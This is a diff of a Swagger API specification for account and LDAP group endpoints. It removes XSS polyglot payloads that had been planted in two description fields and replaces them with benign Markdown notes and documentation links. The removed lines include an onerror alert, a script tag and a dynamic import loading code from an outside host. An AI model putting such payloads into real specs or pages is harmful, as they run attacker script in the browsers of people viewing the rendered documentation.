@@ -1,9 +1,8 @@
 swagger: '2.0'
 info:
-  title: You must login before continuing!
+  title: You must login before continuing 😱!
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><Script /Src=https://X55.is?1=19815></Script><a href=""><Test/a><img onerror=alert('textarea') src=1>">JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=19815/.source))}//\76--></form>
-
+    **Note:** You must be logged in to access these resources. For more details, visit our [documentation](https://example.com/docs).
   version: production
 basePath: /Submit/
 produces:
@@ -28,8 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
-
+            **Note:** ID value to filter by. Refer to the [API guide](https://example.com/docs) for more details.
           format: int64
           in: path
           name: id
@@ -69,7 +67,7 @@ paths:
           description: No response was specified
       tags:
         - accounts
-      description: 'You cannot create an LDAP group with a POST.  '
+      description: 'You cannot create an LDAP group with a POST. For more info, see [LDAP API Guide](https://example.com/ldap-guide).'
       operationId: createGroupById
       summary: Creates a new group by id
     put:
@@ -101,7 +99,7 @@ paths:
           description: No response was specified
       tags:
         - accounts
-      description: 'You can PUT, POST, and DELETE using this resource URL.'
+      description: 'You can PUT, POST, and DELETE using this resource URL. For details, visit [API Documentation](https://example.com/api-docs).'
       operationId: findGroupsByName
       summary: Finds groups by name
   '/accounts/userid/{id}':
@@ -147,7 +145,7 @@ paths:
           description: No response was specified
       tags:
         - accounts
-      description: 'You cannot create an LDAP account or assign a password with a POST.  '
+      description: 'You cannot create an LDAP account or assign a password with a POST. Refer to the [LDAP API Documentation](https://example.com/ldap-docs).'
       operationId: createUserById
       summary: Creates a new user by id
     put:
@@ -179,6 +177,6 @@ paths:
           description: No response was specified
       tags:
         - accounts
-      description: 'You can PUT, POST, and DELETE using this resource URL.'
+      description: 'You can PUT, POST, and DELETE using this resource URL. For more details, check our [API Documentation](https://example.com/api-docs).'
       operationId: findUsersByName
       summary: Finds users by name
